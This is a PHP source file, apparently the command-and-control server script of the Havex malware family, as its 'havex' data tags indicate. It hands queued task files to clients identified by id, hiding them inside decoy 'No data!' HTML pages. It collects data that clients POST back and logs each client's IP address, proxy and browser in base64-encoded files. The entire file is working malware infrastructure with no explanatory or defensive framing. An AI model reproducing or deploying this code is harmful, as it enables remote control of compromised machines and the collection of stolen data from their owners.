<?php
/**
 * todo: Prevent search engines indexing
 * todo: Close dir read by .htaccess
 */


error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING ^ E_ERROR);
@header("Cache-Control: no-cache");
ob_start();

define("PATH_BLOCKFILE", "block.tmp");
define("PATH_LOGFILE", "testlog.php");
define("DATATAG_START", "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>No data!<!--havex");
define("DATATAG_END", "havex--></body></head>");
define("NODATA", "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havexhavex--></body></html>");
define("ANSWERTAG_START", "<xdata d='%s' u='%s'>");
define("ANSWERTAG_END", "</xdata>\n");
define("FILE_OUTPUT_BLOCK_SIZE", 16384);

define("CURRENT_FILE_VERSION", "1.1.16");

if(!function_exists("file_get_contents")) {
    function file_get_contents($filename) {
        if(file_exists($filename)) {
            $data = "";
            $hfile = fopen($filename, "r");
            if(!$hfile) { return false; }
            while(!feof($hfile)) {
                $data .= fread($hfile, 131072);
            }
            fclose($hfile);
            return $data;

        } else {
            return false;
        }
    }
}
if(!function_exists("file_put_contents")) {
    function file_put_contents($filename, $data) {
        $hfile = fopen($filename, "w");
        if(!$hfile) { return false; }
        $res = fwrite($hfile, $data);
        fclose($hfile);
        return $res;
    }
}

function get_user_id() {
    if(isset($_REQUEST['id'])) {
        return preg_replace("([^\d\-a-zA-Z]+)", "", $_REQUEST['id']);
    } else {
        return false;
    }
}

function array_remove($needle, $haystack) {
    $keys = array_keys($haystack, $needle);
    for($i=0; $i<count($keys); $i++) {
        unset($haystack[$keys[$i]]);
    }
    return $haystack;
}

function filter_tasks() {
    $user_id = get_user_id();
    $gtasks_all = glob("mta*.php");

    for($i=0; $i<count($gtasks_all); $i++) {
        $task_stat = str_replace(".php", ".tpl", $gtasks_all[$i]);
        if(file_exists($task_stat)) {
            $ids = explode("\n", file_get_contents($task_stat));
            if(($id = array_search($user_id, $ids)) === false) {
                send_task($gtasks_all[$i], false);
                $ids[] = $user_id;
                file_put_contents($task_stat, implode("\n", $ids));
                return true;
            }
        } else {
            send_task($gtasks_all[$i], false);
            file_put_contents($task_stat, $user_id);
            return true;
        }
    }

    return false;
}

function send_task($filename, $delete = false) {
    echo DATATAG_START;
    if(file_exists($filename)) {
        $fd = fopen($filename, 'r');
        if($fd === false) {
            echo DATATAG_END;
            return false;
        }

        while(!feof($fd)) {
            echo str_replace(array("<?\n/*", "<?\r\n/*", "<?/*"), array("","",""), fread($fd, FILE_OUTPUT_BLOCK_SIZE));
        }
        fclose($fd);

        echo DATATAG_END;
        if($delete) {
            return unlink($filename);
        }
        return true;
    } else {
        echo DATATAG_END;
        return false;
    }
}

function validip($ip) {
	if (!empty($ip) && ip2long($ip) != -1) {
		return true;
	} else {
		return false;
	}
}

function getip() {
	if (validip($_SERVER["HTTP_CLIENT_IP"])) {
		return $_SERVER["HTTP_CLIENT_IP"];
	}

	foreach (explode(",",$_SERVER["HTTP_X_FORWARDED_FOR"]) as $ip) {
		if (validip(trim($ip))) { return $ip; }
	}

	if (validip($_SERVER["HTTP_X_FORWARDED"])) {
		return $_SERVER["HTTP_X_FORWARDED"];
	} elseif (validip($_SERVER["HTTP_FORWARDED_FOR"])) {
		return $_SERVER["HTTP_FORWARDED_FOR"];
	} elseif (validip($_SERVER["HTTP_FORWARDED"])) {
		return $_SERVER["HTTP_FORWARDED"];
	} elseif (validip($_SERVER["HTTP_X_FORWARDED"])) {
		return $_SERVER["HTTP_X_FORWARDED"];
	} else {
		return $_SERVER["REMOTE_ADDR"];
	}
}

function getproxy() {
	if($_SERVER['via'] != "") {
		return $_SERVER['via'];
	} elseif(validip($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != $_SERVER['REMOTE_ADDR']) {
		return $_SERVER['REMOTE_ADDR'];
	} else {
		return false;
	}
}

function fb_write($file, $blockfile, $data, $write_mode = 'a', $tries = 50) {
	$lock = @fopen($blockfile,"a");
	if($lock !== false && @flock($lock, LOCK_EX))
	{
		$out = @fopen($file, $write_mode);
		if(!$out) { /* echo "<br>".__LINE__ . ": can't open outfile"; */ return false; }
		$res = @fwrite($out, $data);
		@fclose($out);
		@flock($lock, LOCK_UN);
		@fclose($lock);
		return $res;
	} else {
		if($tries == 0) { /*echo "<br>".__LINE__ . ": tries=0"; */ return false; }
		usleep(50);
		if($lock !== false) { @fclose($lock); }
		return fb_write($file, $blockfile, $data, $write_mode, $tries - 1);
	}
}

$start_time = gmdate("d-m-Y H:i:s");
$user_ip = getip();
$user_proxy = getproxy();
$user_browser = str_replace("\t", " ", $_SERVER['HTTP_USER_AGENT']);
$request_uri = $_SERVER['REQUEST_METHOD'] . "://" . str_replace("\t", " ", $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
$user_id = get_user_id();

$task_status = $_GET;
foreach($task_status as $key => $val) {
	if(strpos($user_id, $key) == 0 && preg_match("/^([\d]+)$/", $key) > 0) {
		$out_str = base64_encode($start_time . "\t" . $key . "\t" . str_replace("\t", " ", $val)) . "\n";
		fb_write($user_id . ".log", PATH_BLOCKFILE, $out_str);
	}
}

if($_SERVER['REQUEST_METHOD'] == "POST") {
	$answer = @file_get_contents('php://input');
	if($answer !== false && strlen($answer) > 0) {
		fb_write($user_id . ".ans", PATH_BLOCKFILE, sprintf(ANSWERTAG_START . "%s" . ANSWERTAG_END, $start_time, base64_encode($_SERVER['REQUEST_URI']), $answer));
	}
}

$files = glob($user_id . "_*.txt");
if(is_array($files) && count($files) > 0) {
	$out_str = base64_encode($start_time . "\t" . str_replace(".txt", "", $files[0]) . "\tsent") . "\n";
	fb_write($user_id . ".log", PATH_BLOCKFILE, $out_str);

    //echo DATATAG_START . file_get_contents($files[0]) . DATATAG_END;

	if(send_task($files[0], true) === false) {
		$out_str = base64_encode($start_time . "\t" . str_replace(".txt", "", $files[0]) . "\tsend_error[".$files[0]."] ") . serialize(error_get_last()) . "\n";
		fb_write($user_id . ".log", PATH_BLOCKFILE, $out_str);
	}
} elseif(!filter_tasks()) {
    echo NODATA;
}

$request_uri .= "[in:".strlen($answer).",out:".ob_get_length()."]";

$out_str = 	base64_encode($start_time . "\t" .
    $user_ip . "\t" .
    $user_proxy . "\t" .
    $user_id . "\t" .
    $request_uri . "\t" .
    $user_browser) . "\n";
fb_write(PATH_LOGFILE, PATH_BLOCKFILE, $out_str);

ob_flush();